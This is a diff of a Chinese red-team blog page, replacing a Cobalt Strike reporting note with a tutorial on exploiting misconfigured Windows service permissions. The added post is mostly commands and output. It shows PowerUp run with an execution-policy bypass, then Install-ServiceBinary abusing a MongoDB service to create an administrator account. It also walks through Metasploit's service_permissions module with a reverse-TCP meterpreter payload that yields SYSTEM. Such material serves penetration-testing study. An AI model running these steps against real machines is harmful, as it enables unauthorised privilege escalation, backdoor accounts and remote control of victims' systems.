@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【CS学习笔记】4、快速登陆和生成会话报告, Teams Six">
+    <meta name="keywords" content="【内网学习笔记】15、系统服务权限配置不当利用, Teams Six">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>【CS学习笔记】4、快速登陆和生成会话报告 | Teams Six</title>
+    <title>【内网学习笔记】15、系统服务权限配置不当利用 | Teams Six</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -258,12 +258,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-12-04-101402.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【CS学习笔记】4、快速登陆和生成会话报告</h1>
+                    <h1 class="description center-align post-title">【内网学习笔记】15、系统服务权限配置不当利用</h1>
                 </div>
             </div>
         </div>
@@ -380,16 +380,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
-                            </a>
-                        
                             <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">学习笔记</span>
                             </a>
                         
                             <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                 <span class="chip bg-color">红队</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91/">
+                                <span class="chip bg-color">内网</span>
                             </a>
                         
                     </div>
@@ -400,8 +400,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                内网学习笔记
                             </a>
                         
                     </div>
@@ -413,28 +413,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-04-19
+                    2021-07-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-04
+                    2021-07-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    429
+                    531
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -449,24 +449,63 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p>
-<ul>
-<li>输出格式为PDF或者Word格式</li>
-<li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li>
-<li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正</li>
-</ul>
-<h1 id="0x01-导出报告类型"><a href="#0x01-导出报告类型" class="headerlink" title="0x01 导出报告类型"></a>0x01 导出报告类型</h1><ul>
-<li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li>
-<li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li>
-<li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li>
-<li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li>
-<li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li>
-<li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a target="_blank" rel="noopener" href="https://attack.mitre.org/">https://attack.mitre.org/</a></li>
-</ul>
+                <h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a></p>
+<p>在 PowerShell 中导入并执行脚本</p>
+<pre><code>Import-Module .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p>
+<pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;</code></pre>
+<pre><code>PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+ServiceName    : MongoDB
+Path           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s
+                 ervice
+ModifiableFile : C:\Web\mongodb\mongod.conf
+StartName      : LocalSystem
+AbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;</code></pre>
+<p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p>
+<pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;</code></pre>
+<p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p>
+<pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;</code></pre>
+<pre><code>PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;
+
+ServiceName                   ServicePath                   Command                       BackupPath
+-----------                   -----------                   -------                       ----------
+MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd /ad... C:\Web\mongodb\bin\mongod...</code></pre>
+<p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p>
+<pre><code>PS C:\Users\teamssix\Desktop&gt; net user test
+用户名                 test
+全名
+……
+本地组成员             *Administrators       *Users
+全局组成员             *None
+命令成功完成。</code></pre>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p>
+<pre><code>meterpreter &gt; getuid
+Server username: TEAMSSIX\dev</code></pre>
+<p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p>
+<p>利用步骤如下：</p>
+<pre><code>use exploit/windows/local/service_permissions
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.7.1
+set lport 4444
+set session 1
+run</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png"></p>
+<p>可以看到会话直接被提升到了 SYSTEM 权限。</p>
 <blockquote>
-<p>参考链接：</p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powerup.html">https://evi1cg.me/archives/Powerup.html</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
@@ -495,7 +534,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/year/200419-150447.html">https://www.teamssix.com/year/200419-150447.html</a>
+                    <a href="https://www.teamssix.com/year/210722-173157.html">https://www.teamssix.com/year/210722-173157.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -533,16 +572,16 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Cobalt-Strike/">
-                                    <span class="chip bg-color">Cobalt Strike</span>
-                                </a>
-                            
                                 <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
                                 <a href="/tags/%E7%BA%A2%E9%98%9F/">
                                     <span class="chip bg-color">红队</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91/">
+                                    <span class="chip bg-color">内网</span>
                                 </a>
                             
                         </div>
@@ -588,7 +627,7 @@
         owner: 'teamssix',
         proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
         admin: "teamssix",
-        id: '2020-04-19T15-04-47',
+        id: '2021-07-22T17-31-57',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -612,46 +651,45 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/200419-150454.html">
+                <a href="/year/210722-173157.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs5-2.png" class="responsive-img" alt="【CS学习笔记】5、如何建立Payload处理器">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210722172401.png" class="responsive-img" alt="【内网学习笔记】15、系统服务权限配置不当利用">
                         
-                        <span class="card-title">【CS学习笔记】5、如何建立Payload处理器</span>
+                        <span class="card-title">【内网学习笔记】15、系统服务权限配置不当利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。
+                            PowerUpPowerUp 可以用来寻找目标中权限配置不当的服务，下载地址：https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+在 
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
                     
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
@@ -659,6 +697,10 @@
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
@@ -672,30 +714,31 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/200419-150440.html">
+                <a href="/year/210706-155005.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/2019-12-04-101402.jpg" class="responsive-img" alt="【CS学习笔记】3、如何进行分布操作">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210706145250.png" class="responsive-img" alt="【内网学习笔记】14、发现主机缺失补丁">
                         
-                        <span class="card-title">【CS学习笔记】3、如何进行分布操作</span>
+                        <span class="card-title">【内网学习笔记】14、发现主机缺失补丁</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这里介绍最基本的团队服务模型，具体由三个服务器构成，具体如下所示。
+                            0、前言在内网中，往往所有主机打补丁的情况都是相似的，因此在拿下一台主机权限后，可以通过查看当前主机打补丁的情况，从而找到漏洞利用点，进而进行接下来的横向、提权等操作。
+1、手工发现缺失补丁systeminfo直接运行 systeminfo
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-06
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CS-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
-                                    CS 学习笔记
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -705,16 +748,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Cobalt-Strike/">
-                        <span class="chip bg-color">Cobalt Strike</span>
-                    </a>
-                    
                     <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">学习笔记</span>
                     </a>
                     
                     <a href="/tags/%E7%BA%A2%E9%98%9F/">
                         <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
